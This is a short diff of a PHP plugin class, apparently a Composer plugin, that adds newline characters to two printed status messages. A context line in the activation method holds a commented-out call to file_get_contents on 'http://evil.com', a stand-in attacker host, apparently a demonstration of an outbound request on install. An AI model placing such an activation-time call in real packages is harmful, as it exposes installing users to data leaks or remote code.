@@ -45,7 +45,7 @@ class Plugin implements PluginInterface
         // @file_get_contents("http://evil.com", false, $context);
         $this->createTable();
 
-        print_r("Activated.");
+        print_r("Activated.\n\r");
     }
     /**
      * @param string $type
@@ -70,6 +70,6 @@ class Plugin implements PluginInterface
 
     private function createTable()
     {
-      print_r("create table here...");
+      print_r("create table here...\n\r");
     }
 }
